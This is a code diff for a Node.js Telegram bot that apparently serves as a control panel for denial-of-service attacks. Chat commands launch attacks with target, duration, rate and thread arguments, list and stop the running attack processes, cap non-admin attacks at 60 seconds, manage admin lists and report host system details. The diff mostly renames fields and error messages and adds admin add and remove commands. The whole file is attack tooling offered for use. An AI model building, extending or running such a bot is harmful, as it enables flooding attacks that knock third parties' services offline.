@@ -14,15 +14,15 @@ app.get('/', (req, res) => res.send('Bot is running'))
 app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
 
 const activeAttacks = {}
-const GROUP_SETTINGS_PATH = path.join(__dirname, 'assets', 'group_settings.json')
-const ADMIN_LIST_PATH = path.join(__dirname, 'assets', 'admin_lists.json')
+const GROUP_SETTINGS_PATH = path.join(__dirname, 'assets', 'groupSettings.json')
+const ADMIN_LIST_PATH = path.join(__dirname, 'assets', 'adminLists.json')
 
 async function loadJson(filePath) {
   try {
     const data = await fs.readFile(filePath, 'utf8')
     return JSON.parse(data)
   } catch (err) {
-    return {}
+    return filePath.includes('adminLists') ? [] : {}
   }
 }
 
@@ -37,7 +37,10 @@ bot.onText(/\/system/, async (msg) => {
   const isAdmin = admins.includes(msg.from.id)
   const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true
 
-  if (!isAdmin && !isGroupActive) return
+  if (!isAdmin && !isGroupActive) {
+    bot.sendMessage(chatId, JSON.stringify({ error: 'Bot is disabled in this group or you are not an admin' }, null, 2), { parse_mode: 'Markdown' })
+    return
+  }
 
   try {
     const [cpu, mem, disk, os, network, processes] = await Promise.all([
@@ -50,16 +53,17 @@ bot.onText(/\/system/, async (msg) => {
     ])
     const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
     const networkInfo = network.length > 0 ? network[0] : { iface: 'N/A', ip4: 'N/A' }
+    const uptimeSeconds = os.uptime || 0
     const systemInfo = {
-      OS: `${os.distro} ${os.release} (${os.arch})`,
-      Kernel: os.kernel,
-      Hostname: os.hostname,
-      CPU: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
-      RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
-      Disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
-      Network: `${networkInfo.iface} (${networkInfo.ip4})`,
-      Active_Processes: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None',
-      Uptime: `${Math.floor(os.uptime / 3600)}h ${Math.floor((os.uptime % 3600) / 60)}m`
+      os: `${os.distro} ${os.release} (${os.arch})`,
+      kernel: os.kernel,
+      hostname: os.hostname,
+      cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
+      ram: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
+      disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
+      network: `${networkInfo.iface} (${networkInfo.ip4})`,
+      activeProcesses: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None',
+      uptime: `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m`
     }
     bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
   } catch (err) {
@@ -71,7 +75,7 @@ bot.on('message', async (msg) => {
   const id = msg.chat.id
   const text = msg.text?.trim()
   const userId = msg.from.id
-  const username = msg.from.username || 'concho'
+  const username = msg.from.username || 'depTrai'
 
   if (!text) return
 
@@ -80,12 +84,15 @@ bot.on('message', async (msg) => {
   const isAdmin = admins.includes(userId)
   const isGroupActive = groupSettings[id]?.botStatus === true
 
-  if (!isAdmin && !isGroupActive) return
+  if (!isAdmin && !isGroupActive) {
+    bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Bot is disabled in this group or you are not an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    return
+  }
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 4) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
@@ -93,12 +100,12 @@ bot.on('message', async (msg) => {
     const time = parseInt(timeStr)
 
     if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid arguments" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Invalid arguments' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
     if (!isAdmin && time > 60) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Attack time must be ≤ 60 seconds" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack time must be ≤ 60 seconds for non-admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
@@ -107,7 +114,7 @@ bot.on('message', async (msg) => {
     activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null, startTime: Date.now() }
 
     const response = {
-      status: "Attack Started!",
+      status: 'Attack Started',
       target,
       time,
       rate,
@@ -144,7 +151,7 @@ bot.on('message', async (msg) => {
         return
       }
       const updatedResponse = {
-        status: "Attack Running!",
+        status: 'Attack Running',
         target,
         time: activeAttacks[attackId].remainingTime,
         rate,
@@ -201,7 +208,7 @@ bot.on('message', async (msg) => {
   if (text === '/list') {
     const list = Object.entries(activeAttacks)
       .filter(([_, v]) => isAdmin || v.userId === userId)
-      .map(([key, v], i) => ({
+      .map(([key, v]) => ({
         index: key,
         target: v.target,
         time: v.remainingTime,
@@ -214,22 +221,54 @@ bot.on('message', async (msg) => {
   if (text.startsWith('/stop')) {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 1) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/stop <index>" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/stop <index>' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
     const key = args[0]
     const attack = activeAttacks[key]
     if (!attack) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Not found" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack not found' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
     if (!isAdmin && attack.userId !== userId) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Permission denied" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Permission denied' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
     attack.cmd.kill()
     delete activeAttacks[key]
     bot.sendMessage(id, '```json\n' + JSON.stringify({ stopped: true, target: attack.target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+  }
+
+  if (text.startsWith('/add') && msg.reply_to_message) {
+    if (!isAdmin) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can add new admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    const newAdminId = msg.reply_to_message.from.id
+    const newAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
+    if (admins.includes(newAdminId)) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is already an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    admins.push(newAdminId)
+    await saveJson(ADMIN_LIST_PATH, admins)
+    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminAdd: true, fullName: newAdminName, idNewAdmin: newAdminId }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+  }
+
+  if (text.startsWith('/remove') && msg.reply_to_message) {
+    if (!isAdmin) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can remove admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    const removeAdminId = msg.reply_to_message.from.id
+    const removeAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
+    if (!admins.includes(removeAdminId)) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is not an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+    const updatedAdmins = admins.filter(id => id !== removeAdminId)
+    await saveJson(ADMIN_LIST_PATH, updatedAdmins)
+    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminRemove: true, fullName: removeAdminName, idRemovedAdmin: removeAdminId }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
 })
 
